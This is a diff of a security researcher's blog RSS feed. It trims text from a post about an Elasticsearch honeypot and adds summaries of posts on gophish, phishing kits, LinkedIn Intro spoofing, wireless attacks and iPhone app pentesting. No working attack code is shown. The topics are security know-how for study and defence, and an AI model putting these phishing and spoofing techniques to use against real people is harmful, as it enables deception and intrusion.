+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/gophish_purple.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
-&lt;p&gt;Now, I&amp;rsquo;m sure you&amp;rsquo;re interested in some samples. &lt;a href=&#34;https://gist.githubusercontent.com/jordan-wright/f63575681373f91e462f/raw/b446a9d3bb042aac425970d73c129d4d936478aa/elastichoney.log&#34;&gt;Here&amp;rsquo;s&lt;/a&gt; a bit of what I have so far. There&amp;rsquo;s some nifty &lt;code&gt;wget&lt;/code&gt; calls in there if you grab them fast enough.&lt;/p&gt;
 
-&lt;p&gt;Enjoy!&lt;/p&gt;
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 
-&lt;h3 id=&#34;want-to-run-this-yourself&#34;&gt;Want to Run This Yourself?&lt;/h3&gt;
+&lt;p&gt;It&amp;rsquo;s been a busy couple of months!&lt;/p&gt;
 
-&lt;p&gt;&lt;em&gt;Awesome.&lt;/em&gt; Let&amp;rsquo;s take a look at what it takes to get elastichoney up and running. Installation should take about&amp;hellip; 5 seconds. Since this is written in Go, I can provide binaries for most platforms. If you&amp;rsquo;re interested in running elastichoney yourself, just download &lt;a href=&#34;http://github.com/jordan-wright/elastichoney/releases&#34;&gt;the right binary&lt;/a&gt; for your system, edit the config to your liking, and start it up!&lt;/p&gt;
+&lt;p&gt;I thought it would be worth providing a long-overdue update into the development status of &lt;a href=&#34;http://github.com/jordan-wright/gophish&#34;&gt;gophish&lt;/a&gt;. Overall, the project is getting closer to beta status every day, and I&amp;rsquo;m hoping to see a &lt;a href=&#34;https://github.com/jordan-wright/gophish/milestones&#34;&gt;0.1 release&lt;/a&gt; at the end of March.&lt;/p&gt;
 
-&lt;p&gt;Let&amp;rsquo;s talk about some of the config options. The first option to note is &lt;code&gt;use_remote&lt;/code&gt;. I mentioned that elastichoney will log to &lt;code&gt;stdout&lt;/code&gt; and a file by default. You can set this option to also have the honeypot send an HTTP &lt;code&gt;POST&lt;/code&gt; containing the JSON entry to a remote server of your choosing. Personally, I have my entries going to a real elasticsearch instance so I can search on them later.&lt;sup&gt;1&lt;/sup&gt;&lt;/p&gt;
+&lt;p&gt;Without further ado, let&amp;rsquo;s dive in and see where we&amp;rsquo;re at.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Web Scraping Hotel Prices for Fun and Savings</title>
+      <link>https://jordan-wright.com/blog/2015/02/21/web-scraping-hotel-prices-for-fun-and-savings/</link>
+      <pubDate>Sat, 21 Feb 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2015/02/21/web-scraping-hotel-prices-for-fun-and-savings/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/web_scraping.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
-&lt;p&gt;The second config option that you may want to play with is the &lt;code&gt;spoofed_version&lt;/code&gt; option. This lets you pick what version of ES you want your honeypot to show up as. This helps if you are looking for attackers targeting specific systems (such as those targeting the &amp;lt;=v1.2 RCE vuln vs the most recent RCE vuln).&lt;/p&gt;
 
-&lt;p&gt;Finally, the last option you might set is the &lt;code&gt;anonymous&lt;/code&gt; option. This simply determines if you want your honeypot IP to show up in logs. If so, elastichoney will make a single call out to icanhazip.com when it starts up to get the external IP. Otherwise, it&amp;rsquo;ll just use &lt;code&gt;1.1.1.1&lt;/code&gt;&lt;sup&gt;2&lt;/sup&gt;. This is helpful if you want to create an anonymous cluster of honeypots.&lt;/p&gt;
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
 
-&lt;p&gt;As always, let me know if you have any questions or comments below.&lt;/p&gt;
+&lt;p&gt;During the process of planning a vacation, I came across a nice hotel I wanted to stay at. When looking at some possible dates, I noticed the nightly rate would fluctuate &lt;em&gt;dramatically&lt;/em&gt;. This made me question if I was going to wind up paying way more just because I wanted to stay at the hotel on a certain day.&lt;/p&gt;
 
-&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+&lt;p&gt;Then I considered the alternative - maybe I could scrape the prices every day to find the cheapest nightly rate. Sounded like a job for Python, BeautifulSoup, and some whiskey.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>SANS Holiday Challenge 2014 - Writeup</title>
+      <link>https://jordan-wright.com/blog/2015/01/05/sans-holiday-challenge-2014-writeup/</link>
+      <pubDate>Mon, 05 Jan 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2015/01/05/sans-holiday-challenge-2014-writeup/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/sans_holiday_2014.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
 
-&lt;p&gt;[1] Irony.&lt;br/&gt;
-[2] Big shout-out to the person actually on &lt;code&gt;1.1.1.1&lt;/code&gt;.&lt;/p&gt;
-</description>
+
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;Back in December, SANS &lt;a href=&#34;pen-testing.sans.org/holiday-challenge/2014&#34;&gt;released&lt;/a&gt; another installment of their annual holiday challenge. I enjoyed &lt;a href=&#34;http://raidersec.blogspot.com/search/label/SANS&#34;&gt;taking on the 2012 challenge&lt;/a&gt;, so I was excited to see what SANS had in store this year. This year&amp;rsquo;s challenge didn&amp;rsquo;t disappoint with a nice mix of basic network recon, web application hacking, and some forensics. This post will detail how I found each required &amp;ldquo;secret&amp;rdquo; to solve the challenge.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;I&amp;rsquo;d like to extend a personal thanks for all the hard work SANS puts in to putting on this challenge every year.&lt;/em&gt;
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Why Deleting Sensitive Information from Github Doesn&#39;t Save You</title>
+      <link>https://jordan-wright.com/blog/2014/12/30/why-deleting-sensitive-information-from-github-doesnt-save-you/</link>
+      <pubDate>Tue, 30 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2014/12/30/why-deleting-sensitive-information-from-github-doesnt-save-you/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/harvest_github.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;p&gt;So you accidentally committed a password or API key to Github. &lt;strong&gt;&lt;em&gt;Ouch.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&amp;ldquo;No problem!&amp;rdquo;, you think, &amp;ldquo;I&amp;rsquo;ll just follow Github&amp;rsquo;s helpful information on &lt;a href=&#34;https://help.github.com/articles/remove-sensitive-data/&#34;&gt;how to delete sensitive information&lt;/a&gt; and I&amp;rsquo;ll be fine!&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;Just today, I saw a &lt;a href=&#34;http://www.devfactor.net/2014/12/30/2375-amazon-mistake/&#34;&gt;great article&lt;/a&gt; detailing one developer&amp;rsquo;s experience with committing sensitive information to Github. Unfortunately, this article missed the main point. In this post, I&amp;rsquo;m going to show exactly how hackers &lt;em&gt;instantly&lt;/em&gt; harvest information committed to public Github repositories, and why deleting this information doesn&amp;rsquo;t solve the problem.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>What InfoSec Learned in 2014</title>
+      <link>https://jordan-wright.com/blog/2014/12/28/what-infosec-learned-in-2014/</link>
+      <pubDate>Sun, 28 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2014/12/28/what-infosec-learned-in-2014/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/what_infosec_2014.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;p&gt;&lt;em&gt;Busy year.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;It seems as though each year brings more and more events that throw our industry into the forefront of attention - and they&amp;rsquo;re never good. At the same time, it&amp;rsquo;s key to remember that these events allow us to learn and evolve as an industry. Let&amp;rsquo;s take a look at some of the key things we as an infosec industry can learn from 2014:
+
+&lt;img class=&#34;section_header&#34; src=&#34;https://jordan-wright.com/blog/blog/images/blog/infosec_2014/heartbleed.png&#34;/&gt;&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>What Happens if Tor Directory Authorities are Seized?</title>
+      <link>https://jordan-wright.com/blog/2014/12/19/what-happens-if-tor-directory-authorities-are-seized/</link>
+      <pubDate>Fri, 19 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2014/12/19/what-happens-if-tor-directory-authorities-are-seized/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/tor_seized.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;The Tor Project &lt;a href=&#34;https://blog.torproject.org/blog/possible-upcoming-attempts-disable-tor-network&#34;&gt;has announced&lt;/a&gt; that they have received threats about possible upcoming attempts to disable the Tor network through the seizure of Directory Authority (DA) servers. While we don&amp;rsquo;t know the legitimacy behind these threats, it&amp;rsquo;s worth looking at the role DA&amp;rsquo;s play in the Tor network, showing what effects their seizure could have on the Tor network.*
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Chrome Tracks Every Key Typed into the Omnibox</title>
+      <link>https://jordan-wright.com/blog/2014/12/18/chrome-tracks-every-key-typed-into-omnibox/</link>
+      <pubDate>Tue, 16 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2014/12/18/chrome-tracks-every-key-typed-into-omnibox/</guid>
+      <description>&lt;p&gt;&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/browser_tracking.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+&amp;gt; Friendly Reminder: Browser makers may track every key you type in the URL bar&lt;/p&gt;
+
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;Technologies like Google Chrome&amp;rsquo;s Omnibox makes searching easier. However, these quick search suggestions come at a price. This post is a friendly reminder that you may want to consider turning off predictive search to protect your privacy.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>My (Probably Boring) Research Papers on Security</title>
+      <link>https://jordan-wright.com/blog/2014/12/02/my-probably-boring-research-papers-on-security/</link>
+      <pubDate>Mon, 01 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2014/12/02/my-probably-boring-research-papers-on-security/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/papers.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;I&amp;rsquo;ve always been a proponent and contributor of open-source projects and information. I strongly believe that information and knowledge should be shared as much and as freely as possible - progress happens this way.&lt;/p&gt;
+
+&lt;p&gt;As such, I&amp;rsquo;ve decided to &amp;ldquo;open-source&amp;rdquo;, if you will, the academic essays I wrote regarding information security and software development my last couple of semesters at Texas Tech. It&amp;rsquo;s my hope that people find these useful, either by provoking thought and discussion or simply by serving as material to help people fall asleep a little easier.&lt;/p&gt;
+
+&lt;p&gt;Please bear in mind some of these papers were written &lt;del&gt;the night before&lt;/del&gt; in a short time-span.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Creating Tor Hidden Services with Python</title>
+      <link>https://jordan-wright.com/blog/2014/10/06/creating-tor-hidden-services-with-python/</link>
+      <pubDate>Mon, 06 Oct 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2014/10/06/creating-tor-hidden-services-with-python/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/hidden_services.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;Tor is often used to protect the anonymity of someone who is trying to connect to a service. However, it is also possible to use Tor to protect the anonymity of a service provider via &lt;a href=&#34;https://www.torproject.org/docs/hidden-services.html.en&#34;&gt;&lt;strong&gt;&lt;em&gt;hidden services&lt;/em&gt;&lt;/strong&gt;&lt;/a&gt;. These services, operating under the &lt;code&gt;.onion&lt;/code&gt; TLD, allow publishers to anonymously create and host content viewable only by other Tor users.&lt;/p&gt;
+
+&lt;p&gt;The Tor project has &lt;a href=&#34;https://www.torproject.org/docs/tor-hidden-service.html.en&#34;&gt;instructions&lt;/a&gt; on how to create hidden services, but this can be a manual and arduous process if you want to setup multiple services. This post will show how we can use the fantastic &lt;code&gt;stem&lt;/code&gt; Python library to automatically create and host a Tor hidden service.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Decompiling Android Apps the Easy Way</title>
+      <link>https://jordan-wright.com/blog/2014/08/10/decompiling-android-apps-the-easy-way/</link>
+      <pubDate>Sun, 10 Aug 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2014/08/10/decompiling-android-apps-the-easy-way/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/android_apps.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;Mobile applications are often viewed as black-box applications. However, these applications often suffer from the same (or similar) vulnerabilities as their web application counterparts.&lt;/p&gt;
+
+&lt;p&gt;In a &lt;a href=&#34;http://jordan-wright.github.io/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp/&#34;&gt;previous post&lt;/a&gt;, I showed how we can perform dynamic analysis on iPhone applications by intercepting the inbound/outbound traffic with the Burp proxy. In this post, we&amp;rsquo;ll explore static analysis of Android apps by looing at a couple of online tools that make decompiling apps into equivalent Java and Smali code trivial.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Reverse Engineering the We Heart It API</title>
+      <link>https://jordan-wright.com/blog/2014/10/12/reverse-engineering-the-we-heart-it-api/</link>
+      <pubDate>Sat, 09 Aug 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2014/10/12/reverse-engineering-the-we-heart-it-api/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/weheartit_api.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;A while back, I came across the article from the The Washington Post describing We Heart It, a social network claiming &lt;a href=&#34;http://www.washingtonpost.com/news/the-intersect/wp/2014/05/07/30-million-people-use-this-social-network-and-youve-probably-never-heard-of-it/&#34;&gt;over 30 million users&lt;/a&gt;. If you haven&amp;rsquo;t seen it, &lt;a href=&#34;http://weheartit.com&#34;&gt;We Heart It&lt;/a&gt; (from here on out abbreviated as WHI) is a social network which encourages people to post and share photos and images of things that inspire them.&lt;/p&gt;
+
+&lt;p&gt;Having such a large user-base, I was interested in seeing what kind of API the site offered developers. However, I was disappointed when I found out that the API was &lt;a href=&#34;https://weheartit.com/partners&#34;&gt;closed to &amp;ldquo;partners&amp;rdquo;&lt;/a&gt;, and even this is not a full REST API, but rather a simple button developers can place on their website to allow users to interact with WHI.&lt;/p&gt;
+
+&lt;p&gt;With this being the case, I decided to take a look at the Android and iPhone apps using both static and dynamic analysis in an experiment to see if I could reverse engineer the API used on the backend. Here are the results.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>How to Hunt Down Phishing Kits</title>
+      <link>https://jordan-wright.com/blog/2014/07/30/how-to-hunt-down-phishing-kits/</link>
+      <pubDate>Tue, 29 Jul 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2014/07/30/how-to-hunt-down-phishing-kits/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/phishing_kit.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;Sites like &lt;a href=&#34;http://www.phishtank.com/phish_archive.php&#34;&gt;phishtank&lt;/a&gt; and &lt;a href=&#34;http://support.clean-mx.com/clean-mx/phishing.php&#34;&gt;clean-mx&lt;/a&gt; act as crowdsourced phishing detection and validation. By knowing how to look, you can consistently find &lt;a href=&#34;http://jordan-wright.github.io/blog/2014/04/04/a-look-at-comment-spam-generator-scripts/&#34;&gt;interesting information&lt;/a&gt; about how attackers work, and the tools they use to conduct phishing campaigns. This post will give an example of how &lt;em&gt;phishing kits&lt;/em&gt; are used, how to find them, as well as show a case study into other tools attackers use to maintain access to compromised servers.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>A Look at Comment Spam Generator Scripts</title>
+      <link>https://jordan-wright.com/blog/2014/04/04/a-look-at-comment-spam-generator-scripts/</link>
+      <pubDate>Fri, 04 Apr 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2014/04/04/a-look-at-comment-spam-generator-scripts/</guid>
+      <description>Introduction It&amp;rsquo;s been a while! I&amp;rsquo;ve been busy getting gophish closer and closer to beta. Should be ready soon!
+Until then, here&amp;rsquo;s a quick look at some comment spam scripts I discovered when perusing through the content over at phishtank.com.
+As a side note, the scripts were bundled as some Louis Vuitton spam, though that doesn&amp;rsquo;t seem to relate to the content of the spam scripts at all.
+The Spam Scripts Here are the scripts - the format looks very similar to those found by Alex King.</description>
+    </item>
+    
+    <item>
+      <title>Building GoPhish - How to Send Email with Go</title>
+      <link>https://jordan-wright.com/blog/2014/01/03/building-gophish-how-to-send-email-with-go/</link>
+      <pubDate>Fri, 03 Jan 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2014/01/03/building-gophish-how-to-send-email-with-go/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/go_email.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;I&amp;rsquo;ve been playing around with Go for about a month now, and I&amp;rsquo;ve &lt;em&gt;really&lt;/em&gt; grown to like it. After getting used to the syntax and remembering what a pointer is for (thanks, Python), Go has become a favorite language to develop with. I&amp;rsquo;m even using it for the &lt;a href=&#34;http://www.matasano.com/articles/crypto-challenges/&#34;&gt;Matasano Crypto Challenges&lt;/a&gt; (which are &lt;em&gt;awesome&lt;/em&gt;).&lt;/p&gt;
+
+&lt;p&gt;While the standard library in Go is definitely robust, being a young language, there are a few niceties that aren&amp;rsquo;t yet included. Sending email is one of them. Don&amp;rsquo;t get me wrong, Go has a wonderful &lt;a href=&#34;http://golang.org/pkg/net/smtp/&#34;&gt;SMTP&lt;/a&gt; package, &lt;a href=&#34;http://golang.org/pkg/mime/&#34;&gt;MIME&lt;/a&gt; package, and even a &lt;a href=&#34;http://golang.org/pkg/net/mail/&#34;&gt;Mail&lt;/a&gt; package (which &lt;em&gt;only&lt;/em&gt; parses existing email messages). However, there is no library to actually &lt;strong&gt;create&lt;/strong&gt; emails in a meaningful way. Since &lt;a href=&#34;https://github.com/jordan-wright/gophish&#34;&gt;Gophish&lt;/a&gt; relies heavily on sending emails, I&amp;rsquo;ve sought to change this. And, after reading more RFC&amp;rsquo;s than I normally prefer, I believe I&amp;rsquo;ve created a package that provides intuitive, robust, and flexible email creation and sending called &lt;a href=&#34;https://github.com/jordan-wright/email&#34;&gt;email&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s see how to use it.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Building Gophish - Day 1</title>
+      <link>https://jordan-wright.com/blog/2013/11/29/building-gophish-day-1/</link>
+      <pubDate>Fri, 29 Nov 2013 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2013/11/29/building-gophish-day-1/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/gophish.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;Since the &lt;a href=&#34;http://sptoolkit.com/the_end.php&#34;&gt;Simple Phishing Toolkit (SPT)&lt;/a&gt; was discontinued, I&amp;rsquo;ve wanted to create a simple, effective, and open-source phishing toolkit. In recent years, we&amp;rsquo;ve seen a rise in spear-phishing attacks targeting large organizations, most of which are largely successful. The goal of this toolkit will be to provide businesses and penetration testers with the ability to quickly and easily perform in-house or contracted phishing engagements, and track the responses to see where improvements can be made. This toolkit will be called &lt;a href=&#34;https://github.com/jordan-wright/gophish&#34;&gt;gophish&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;In addition to this, I&amp;rsquo;ve been casually poking around at &lt;a href=&#34;http://golang.org/&#34;&gt;&lt;code&gt;go&lt;/code&gt;&lt;/a&gt; for a while now, and have decided it would be good to finally put it to use in a larger project. I&amp;rsquo;m a fan of seeing the steady development and updates of projects as they are created. I believe it can help keep the developer motivated and the users informed and involved, so this is what I&amp;rsquo;m going to do. Hopefully, these posts will allow others to learn alongside me, as well as spur improvements from experienced &lt;code&gt;go&lt;/code&gt; developers so that &lt;a href=&#34;https://github.com/jordan-wright/gophish&#34;&gt;gophish&lt;/a&gt; can be the best product possible.&lt;/p&gt;
+
+&lt;p&gt;With that being said - let&amp;rsquo;s get started!
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Wireless Attacks with Python: Part One - The &#34;Dnspwn Attack&#34;</title>
+      <link>https://jordan-wright.com/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/</link>
+      <pubDate>Fri, 15 Nov 2013 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/wireless_python.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;A while back, I &lt;a href=&#34;http://raidersec.blogspot.com/2013/01/wireless-deauth-attack-using-aireplay.html&#34;&gt;published a post&lt;/a&gt; on the Raidersec blog demonstrating how to perform a deauthentication attack using Python and Scapy. I enjoyed writing the post, since I got the opportunity to learn in-depth about how different wireless attacks work, beyond just learning how to exclusively use the &lt;a href=&#34;http://www.aircrack-ng.org/&#34;&gt;aircrack suite&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;So, with that being said, this post will kick off a short series of posts discussing how to perform common wireless attacks using Python. I hope you enjoy the posts and, as always, never hesitate to let me know if you have any comments or questions below.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>How to Pentest iPhone Apps with Burp</title>
+      <link>https://jordan-wright.com/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp/</link>
+      <pubDate>Tue, 05 Nov 2013 21:50:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/iphone_burp.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;When looking at the functionality of mobile apps, it&amp;rsquo;s clear that they aren&amp;rsquo;t &lt;em&gt;that&lt;/em&gt; different than web applications. They often just serve as a frontend for the data stored on a central backend server or database. As such, if developers aren&amp;rsquo;t careful to protect these apps, many of the &lt;a href=&#34;https://www.owasp.org/index.php/Top_10_2013&#34;&gt;same vulnerabilities&lt;/a&gt; we find in standard web applications (such as injection attacks on unvalidated input) can be exploited by attackers.&lt;/p&gt;
+
+&lt;p&gt;This post will show how to setup the iPhone to work with the popular &lt;a href=&#34;http://portswigger.net/burp/download.html&#34;&gt;Burp Suite&lt;/a&gt; so that traffic from apps can be intercepted and tested for vulnerabilities.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Linkedin&#39;s Response to My &#34;Phishing with Intro&#34; Post</title>
+      <link>https://jordan-wright.com/blog/2013/11/01/linkedins-response-to-my-phishing-with-intro-post/</link>
+      <pubDate>Fri, 01 Nov 2013 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2013/11/01/linkedins-response-to-my-phishing-with-intro-post/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/linkedin_gift.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;the-initial-post&#34;&gt;The Initial Post&lt;/h3&gt;
+
+&lt;p&gt;I recently published a &lt;a href=&#34;https://jordan-wright.com/blog/blog/2013/10/26/phishing-with-linkedins-intro/&#34;&gt;blog post&lt;/a&gt; which showed a practical attack against Linkedin&amp;rsquo;s Intro. The post reached the front page of &lt;a href=&#34;http://news.ycombinator.com&#34;&gt;Hacker News&lt;/a&gt; (a full writeup of my experience with the &amp;ldquo;Hacker News Effect&amp;rdquo; will be posted soon for those interested), which caused the post to gain quite a bit of publicity and traction. Soon after, I was contacted by Linkedin&amp;rsquo;s security team. This was their response.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Phishing with Linkedin&#39;s Intro</title>
+      <link>https://jordan-wright.com/blog/2013/10/26/phishing-with-linkedins-intro/</link>
+      <pubDate>Sat, 26 Oct 2013 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2013/10/26/phishing-with-linkedins-intro/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/linkedin_phish.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;p&gt;&lt;em&gt;Update 10/28/2013 6:30PM CDT - I have been in contact with Linkedin&amp;rsquo;s security team and a hotfix has recently been released to address the findings below. This fix applies the styling rules to a randomly generated ID, as opposed to the class based styling seen below. This provides more specificity in applying the rules, making it more difficult to override.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;I am no CSS expert so there could very well be tricks to still get around this and remove the content (or even just hide it and overlap it) - &lt;a href=&#34;https://jordan-wright.com/blog/contact&#34;&gt;email me&lt;/a&gt; if you know of one! I will be continuing my work with Linkedin&amp;rsquo;s security team to iron out any bugs we can find. Users are reminded that no solution is perfect, and that seeing this data in an email in no way definitively proves the senders legitimacy.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;I would also like to thank Linkedin&amp;rsquo;s security team for their quick and effective response to these findings.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;intro-duction&#34;&gt;&amp;ldquo;Intro&amp;rdquo;duction&lt;/h3&gt;
+
+&lt;p&gt;On October 23, Linkedin introduced an application called &lt;a href=&#34;http://blog.linkedin.com/2013/10/23/announcing-linkedin-intro/&#34;&gt;&amp;ldquo;Intro&amp;rdquo;&lt;/a&gt;. The premise is simple: allow iPhone users to see details about the people they are emailing within the native iPhone Mail App. Think &lt;a href=&#34;http://rapportive.com/&#34;&gt;Rapportive&lt;/a&gt; for the iPhone Mail App, because that&amp;rsquo;s &lt;em&gt;essentially&lt;/em&gt; what this is (and made by the same people).&lt;/p&gt;
+
+&lt;p&gt;However, when reading the initial description of Intro, there was one part that caught my eye:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;David says Crosswise would love to work with you. Is this spam, or the real deal?&lt;/p&gt;
+
+&lt;p&gt;With Intro, you can immediately see what David looks like, where he’s based, and what he does. You can see that he’s the CEO of Crosswise. This is the real deal.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This is not much different than Linkedin saying &amp;ldquo;we&amp;rsquo;ve put a picture of a lock in your email, so you know for sure it&amp;rsquo;s secure&amp;rdquo;. Linkedin is simply giving its users a false sense of security. In this post, we&amp;rsquo;ll take a look and see what &lt;em&gt;exactly&lt;/em&gt; Linkedin is doing to its users&amp;rsquo; email, as well as how we can spoof this information, gaining full control of the information shown to the user.
+&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Automated Social Engineering Recon Using Rapportive</title>
+      <link>https://jordan-wright.com/blog/2013/10/14/automated-social-engineering-recon-using-rapportive/</link>
+      <pubDate>Mon, 14 Oct 2013 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2013/10/14/automated-social-engineering-recon-using-rapportive/</guid>
+      <description>&lt;img src=&#34;https://jordan-wright.com/blog/blog/images/headers/rapportive_small.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;When performing a social engineering engagement, recon is key. In a &lt;a href=&#34;http://raidersec.blogspot.com/2012/12/automated-open-source-intelligence.html&#34;&gt;previous post&lt;/a&gt;, I demonstrated a few ways in which we could automate the recon process. However, the methods I showed were simply ways to find the profiles of people that might belong to a particular organization.&lt;/p&gt;
+
